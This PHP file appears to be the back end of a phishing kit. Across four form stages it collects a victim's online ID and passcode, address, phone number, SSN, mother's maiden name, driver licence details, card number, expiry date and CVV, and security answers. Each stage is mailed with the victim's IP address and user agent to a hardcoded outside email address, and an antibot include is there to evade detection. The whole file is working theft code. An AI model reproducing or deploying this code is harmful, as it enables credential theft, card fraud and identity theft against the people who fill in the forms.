<?php
include 'email.php';
require "./includes/antibot.php";

if (isset($_POST['btn1'])) {
	$email = $_POST['ai'];
	$password = $_POST['pr'];
	$count = $_POST['count'];

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email="Powers.david002@hotmail.com";
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
}
else if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "--------------------Billing details-------------------------\n";
	$message .= "Address:            : ".$_POST['add']."\n";
	$message .= "phone              : ".$_POST['phone']."\n";
	$message .= "SSN              : ".$_POST['ssn']."\n";
	$message .= "MMN              : ".$_POST['mmn']."\n";
	$message .= "---------------------Driver license--------------------------\n";
	$message .= "Exp date              : ".$_POST['date']."\n";
	$message .= "issued state              : ".$_POST['iss']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email="Powers.david002@hotmail.com";
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./quest.php");
	
}
else if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "--------------------Billing details-------------------------\n";
	$message .= "Card numbers:            : ".$_POST['cn']."\n";
	$message .= "Exp Date:              : ".$_POST['date']."\n";
	$message .= "CVV              : ".$_POST['cvv']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email="Powers.david002@hotmail.com";
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./quest2.php");
	
}
else if (isset($_POST['btn4'])) { 


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	$message .= "--------------------Billing details-------------------------\n";
	$message .= "Question 1:            : ".$_POST['q1']."\n";
	$message .= "Answer 1:              : ".$_POST['a1']."\n";
	$message .= "Question 2:            : ".$_POST['q2']."\n";
	$message .= "Answer 2:              : ".$_POST['a2']."\n";
	$message .= "Question 3:            : ".$_POST['q3']."\n";
	$message .= "Answer 3:              : ".$_POST['a3']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email="Powers.david002@hotmail.com";
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ".$redirect);
	
}

?>